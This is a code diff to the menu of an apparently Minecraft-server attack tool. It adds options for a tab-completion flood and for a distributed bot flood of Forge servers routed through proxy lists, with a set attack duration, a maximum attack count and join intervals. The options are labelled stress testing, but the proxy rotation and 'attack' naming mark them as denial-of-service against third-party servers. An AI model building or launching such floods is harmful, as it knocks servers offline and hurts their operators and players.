@@ -2,6 +2,8 @@ package me.alikomi.endminecraft.utils;
 
 import me.alikomi.endminecraft.Main;
 import me.alikomi.endminecraft.tasks.attack.*;
+import me.alikomi.endminecraft.tasks.attack.forge.DistributedForgeBotAttack;
+import me.alikomi.endminecraft.tasks.attack.forge.GetModList;
 
 import java.io.IOException;
 import java.net.Proxy;
@@ -52,6 +54,29 @@ public class Menu extends Util {
         distributedBotAttack.startAttack();
     }
 
+    public void _3() {
+        log("请输入用于压测的Username(ALi_att)");
+        String name = getCo(scanner.nextLine(),"ALi_att");
+        log("请输入线程数");
+        int threads = getCo(scanner.nextLine(),32);
+        new TabWithOneIp(ip,port,threads,name).startAttack();
+    }
+
+    public void _4() throws IOException, InterruptedException {
+        log("分布式假人压测选择", "请输入攻击时长！(1000s)");
+        long time = getCo(scanner.nextLine(),1000);
+        log("请输入最大攻击数(10000)");
+        int maxAttack = getCo(scanner.nextLine(),10000);
+        log("请输入每次加入服务器间隔(ms)");
+        int sleepTime = getCo(scanner.nextLine(),1);
+        log("请输入是否开启TAB攻击 y/n，默认开启(y)");
+        boolean tab = getCo(scanner.nextLine(),"y").equals("y");
+        log("请输入是否开启操死乐乐模式 y/n，默认关闭(n)");
+        boolean lele = getCo(scanner.nextLine(),"n").equals("y");
+        Map<String, Proxy.Type> ips = getProxy(maxAttack);
+        DistributedForgeBotAttack distributedBotAttack = new DistributedForgeBotAttack(ip, port, time * 1000, sleepTime, ips,tab,lele,new GetModList(ip,port).get());
+        distributedBotAttack.startAttack();
+    }
     private Map<String, Proxy.Type> getProxy(int maxAttack) throws IOException, InterruptedException {
         log("请输入代理ip列表获取方式（2）：", "1.通过API获取", "2.通过本地获取", "3.官方获取");
         Map<String, Proxy.Type> ips;
